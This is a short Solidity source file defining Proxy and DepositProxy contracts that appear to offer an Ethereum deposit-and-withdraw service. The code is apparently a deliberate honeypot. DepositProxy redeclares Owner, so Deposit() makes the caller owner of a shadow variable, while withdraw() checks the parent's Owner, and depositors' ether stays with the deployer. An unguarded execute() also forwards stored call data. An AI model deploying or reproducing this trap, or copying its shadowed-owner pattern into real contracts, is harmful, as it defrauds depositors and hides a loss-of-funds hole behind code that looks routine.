1 pragma solidity ^0.4.20;
2 
3 contract Proxy  {
4     address public Owner = msg.sender;
5     address public Proxy = 0x0;
6     bytes data;
7     modifier onlyOwner { if (msg.sender == Owner) _; }
8     function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
9     function proxy(address _proxy) onlyOwner { Proxy = _proxy; }
10     function () payable { data = msg.data; }
11     function execute() returns (bool) { return Proxy.call(data); }
12 }
13 
14 contract DepositProxy is Proxy {
15     address public Owner;
16     mapping (address => uint) public Deposits;
17 
18     event Deposited(address who, uint amount);
19     event Withdrawn(address who, uint amount);
20     
21     function Deposit() payable {
22         if (msg.sender == tx.origin) {
23             Owner = msg.sender;
24             deposit();
25         }
26     }
27 
28     function deposit() payable {
29         if (msg.value >= 1 ether) {
30             Deposits[msg.sender] += msg.value;
31             Deposited(msg.sender, msg.value);
32         }
33     }
34     
35     function withdraw(uint amount) payable onlyOwner {
36         if (Deposits[msg.sender]>=amount) {
37             msg.sender.transfer(amount);
38             Withdrawn(msg.sender, amount);
39         }
40     }
41 }